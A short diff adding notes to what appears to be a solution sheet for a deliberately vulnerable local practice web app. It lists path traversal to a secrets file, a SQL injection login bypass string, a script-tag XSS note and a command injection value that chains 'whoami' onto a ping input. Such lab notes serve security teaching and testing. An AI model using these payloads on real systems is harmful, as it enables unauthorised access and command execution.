@@ -3,3 +3,21 @@
 http://127.0.0.1:8080/find_secret?file=..\..\..\secrets.txt
 
 
+### SQLi
+
+enter "' OR 'a'='a';--" inside the Email Address field
+
+### XSS
+
+After logging in as a user,
+Add a note such as "<script> alert(1) </script>"
+
+
+
+### Command injection
+
+
+go to http://127.0.0.1:8080/ping and
+
+enter "127.0.0.1 | whoami"
+
